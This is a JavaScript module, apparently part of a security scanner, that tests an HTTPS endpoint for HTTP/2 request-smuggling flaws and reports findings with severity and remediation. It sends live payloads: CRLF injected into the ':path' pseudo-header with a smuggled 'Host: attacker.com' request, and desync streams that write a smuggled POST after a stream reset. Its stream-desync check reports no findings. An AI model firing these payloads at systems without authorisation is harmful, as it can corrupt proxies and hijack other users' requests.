import { logger } from '../utils/logger.js';
import http2 from 'http2';
import { URL } from 'url';

export async function testHttp2Attacks(endpoint, options = {}) {
    const findings = [];
    const timeout = options.timeout || 10000;
    
    logger.info(`[HTTP2] Testing endpoint for HTTP/2 vulnerabilities: ${endpoint.url}`);

    try {
        const urlObj = new URL(endpoint.url);
        if (urlObj.protocol !== 'https:') {
            logger.debug('[HTTP2] Skipping HTTP/2 tests on non-HTTPS endpoint.');
            return findings; // H2 usually requires TLS
        }

        // 1. HTTP/2 Pseudo-Header Injection (CRLF)
        // In HTTP/2, headers are sent as binary frames, but proxies might translate them back to HTTP/1.1
        // Injecting CRLF into pseudo-headers (:path, :authority) can cause request smuggling on backend proxies
        let client;
        try {
            client = http2.connect(urlObj.origin, { rejectUnauthorized: false });
            
            client.on('error', () => { /* Ignore conn errors */ });
            
            const injectedPath = `${urlObj.pathname}?cb=1 HTTP/1.1\r\nHost: attacker.com\r\n\r\nGET /`;
            
            const req = client.request({
                ':method': 'GET',
                ':path': injectedPath,
                ':authority': urlObj.host
            });
            
            let status = 0;
            req.on('response', (headers) => {
                status = headers[':status'];
            });
            
            req.on('end', () => {
                if (status >= 200 && status < 400) {
                    // If the server didn't outright reject the invalid :path with a 400 Bad Request,
                    // it might have forwarded the smuggled request.
                    findings.push({
                        title: 'HTTP/2 Pseudo-Header Injection (Potential Smuggling)',
                        description: `The server accepted an HTTP/2 request with CRLF sequences injected into the ':path' pseudo-header (returned HTTP ${status}). This indicates the front-end server does not strictly validate pseudo-headers before translating them to HTTP/1.1 for backend communication, potentially leading to HTTP Request Smuggling.`,
                        category: 'INJECTION',
                        severity: 'HIGH',
                        cvss: 7.5,
                        detectedBy: 'http2-engine',
                        confidence: 70, // Needs OAST confirmation or differential analysis for true positive
                        evidence: [{ type: 'REQUEST', title: 'Payload', content: `':path': '${injectedPath}'` }],
                        remediation: 'Ensure the front-end reverse proxy or load balancer strictly validates all HTTP/2 pseudo-headers and drops requests containing carriage returns or newlines (CRLF) in header values.'
                    });
                }
                client.close();
            });
            
            req.end();
            
            // Wait for request to finish
            await new Promise(r => setTimeout(r, 2000));
        } catch (e) {
            if (client) client.close();
        }

        // 2. HTTP/2 Stream Multiplexing Desync
        // Send concurrent streams with conflicting states to confuse stateful proxies
        try {
            client = http2.connect(urlObj.origin, { rejectUnauthorized: false });
            
            const streams = [];
            for (let i = 0; i < 5; i++) {
                const req = client.request({
                    ':method': 'POST',
                    ':path': urlObj.pathname,
                    'content-length': 100, // Claiming 100 bytes
                    'x-test-stream': i
                });
                streams.push(req);
            }
            
            // Send partial data and abruptly reset some streams while leaving others hanging
            streams[0].write('data chunk 1');
            streams[1].write('data chunk 1');
            streams[0].rstStream(http2.constants.NGHTTP2_CANCEL); // Reset stream 0
            
            // Try to send smuggled headers on stream 1 after stream 0 is reset
            try { streams[1].write('POST /smuggled HTTP/1.1\r\nHost: attacker\r\n\r\n'); } catch (e) {}
            
            // Clean up
            setTimeout(() => {
                streams.forEach(s => {
                    try { if (!s.closed) s.close(); } catch (e) {}
                });
                client.close();
            }, 2000);

            // We log this as an aggressive test. True detection of stream desync requires OAST 
            // or analyzing backend logs. We will not generate a generic finding here unless we have 
            // specific OAST interactions (omitted for brevity, similar to previous modules).
            
        } catch (e) {
            if (client) client.close();
        }

    } catch (e) {
        logger.error(`[HTTP2] Test failed: ${e.message}`);
    }

    return findings;
}
